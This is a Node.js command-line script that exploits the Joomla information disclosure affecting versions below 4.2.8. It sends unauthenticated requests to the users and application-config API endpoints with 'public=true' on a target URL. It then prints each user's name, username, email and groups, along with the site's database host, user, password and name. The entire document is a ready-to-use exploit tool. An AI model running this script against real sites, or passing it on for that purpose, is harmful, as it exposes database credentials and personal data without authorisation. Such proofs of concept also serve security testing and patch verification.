const axios = require('axios');
const docopt = require('docopt').docopt;

const doc = `
  Joomla! < 4.2.8 - Unauthenticated information disclosure
  - @tegal1337
  Usage:
    ${process.argv[1]} <url> [options]
    ${process.argv[1]} -h | --help

  Parameters:
    <url>       Root URL (base path) including HTTP scheme, port and root folder

  Options:
    --debug     Display arguments
    --no-color  Disable colorized output
    -h, --help  Show this screen
`;

async function fetchUsers(rootUrl) {
  const vulnUrl = `${rootUrl}/api/index.php/v1/users?public=true`;
  return axios.get(vulnUrl);
}

async function parseUsers(rootUrl) {
  const response = await fetchUsers(rootUrl);
  const data = response.data['data'];
  const users = data.filter(user => user['type'] === 'users').map(user => {
    const attributes = user['attributes'];
    return {id: attributes.id, name: attributes.name, username: attributes.username, email: attributes.email, groups: attributes.group_names};
  });
  return users;
}

async function fetchConfig(rootUrl) {
  const vulnUrl = `${rootUrl}/api/index.php/v1/config/application?public=true`;
  return axios.get(vulnUrl);
}

async function parseConfig(rootUrl) {
  const response = await fetchConfig(rootUrl);
  const data = response.data['data'];
  const config = {};
  data.forEach(entry => {
    if (entry['type'] === 'application') {
      const key = Object.keys(entry['attributes'])[0];
      config[key] = entry['attributes'][key];
    }
  });
  return config;
}

async function main() {
  const args = docopt(doc);
  const url = args['<url>'];

  const users = await parseUsers(url);
  console.log('Users:');
  users.forEach(u => console.log(`[${u.id}] ${u.name} (${u.username}) - ${u.email} - ${u.groups}`));
  
  const config = await parseConfig(url);
  console.log('Site info:');
  console.log(`Site name: ${config['sitename']}`);
  console.log(`Editor: ${config['editor']}`);
  console.log(`Captcha: ${config['captcha']}`);
  console.log(`Access: ${config['access']}`);
  console.log(`Debug status: ${config['debug']}`);
  console.log('Database info:');
  console.log(`DB type: ${config['dbtype']}`);
  console.log(`DB host: ${config['host']}`);
  console.log(`DB user: ${config['user']}`);
  console.log(`DB password: ${config['password']}`);
  console.log(`DB name: ${config['db']}`);
  console.log(`DB prefix: ${config['dbprefix']}`);
  console.log(`DB encryption ${config['dbencryption']}`);
}

main();
